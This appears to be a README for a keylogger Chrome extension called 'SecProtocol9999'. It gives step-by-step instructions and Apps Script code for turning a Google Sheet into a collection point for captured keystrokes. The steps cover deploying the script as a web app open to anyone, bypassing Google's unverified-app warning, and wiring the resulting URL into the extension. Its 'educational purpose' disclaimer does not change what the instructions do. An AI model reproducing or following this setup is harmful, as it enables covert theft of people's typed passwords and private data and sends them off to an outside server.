# DISCLAIMER : [NOTICE] - IT SHOULD ONLY BE USED FOR EDUCATIONAL PURPOSE BY SENIOR DEVELOPERS. ANY MISUSE OF "Mushahid Ali's" CODE WILL BE CONSIDERED AS A PUNISHABLE OFFENSE!

Before using this Chrome Extension, first create the following -

#1. Create a Google Spreadsheet at : https://docs.google.com/spreadsheets/u/0/ so that we can make Google Sheets as a database where we can store all the keylogged data!

#2. At the first row, first column[A1]; insert text such as "first".

#3. At the first row, second column[B1]; insert text such as "second".

#4. Now, we need a script(INTERFACE) to connect Google Sheets(dataBase) with our Chrome Extension script. For that we'll be using Google App Script service. Go to "Tools" and then select to Script Editor.

#5. In the code section, paste the following code, save it, run the code : 

```
function doGet(e) {
    //Displays the text on the webpage.
    return ContentService.createTextOutput("This is a GET Request!");
}

function doPost(e) {
    var sheet = SpreadsheetApp.getActiveSheet();
    
    //Parsing the request body
    var body = JSON.parse(e.postData.contents)
    
    //Adding a new row with content from the request body
    sheet.appendRow([body.first,
    body.second
    ])
}
```

#6. Go to "Deploy" and then click on "New Deployment".

#7. In it, click on the "Service Type" and click on "Web App". Fill the data only for : "Execute as" to : YOURMAIL@MAIL.com AND "Who has access" to : "anyone".

#8. And then deploy it. NOTICE : If it asks for "Review permission", grant it permission even if it is showing "This App ins't verified", click on Advanced and click on the unsafe link below it.

#9. And FINALLY it will provide you with a Web App URL(LINK), copy it and paste it in the two variables known as "url" in the "secprotocol.js" file before using the SecProtocol9999 Chrome:extension services! All The Chrome Extension files should be inside a folder for it to be usable!

IF YOU DO NOT KNOW HOW TO UPLOAD "CHROME EXTENSION", FOLLOW THE STEPS BELOW : 
-> Go to, chrome://extensions and click on the "Load Unpacked" button and select your Chrome Extension Folder known as "secprotocol9999" and that's all!

This Is Mushahid Ali, signing out!
ENJOY!
